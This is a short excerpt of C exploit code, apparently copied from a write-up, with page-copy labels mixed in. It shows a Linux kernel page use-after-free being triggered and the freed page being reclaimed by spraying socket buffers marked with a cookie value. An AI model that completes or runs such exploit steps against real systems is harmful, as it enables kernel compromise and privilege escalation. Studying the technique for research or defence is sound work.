复制
// payload.c (compacted)
for (size_t i = 0; i < SK_BUFF_RECLAIM; ++i)
    sk_buff_prepare(svs[i]);                                     // [1] socket pairs

代码
复制
trigger();                                                       // [2] trigger page uaf
for (size_t i = 0; i < SK_BUFF_RECLAIM; ++i) {
    SKB_SET((0xDEADBEEFULL << 32) | i);                           // [3] set cookie
    sk_buff_alloc_0_order_page(svs[i]);
}

代码
复制
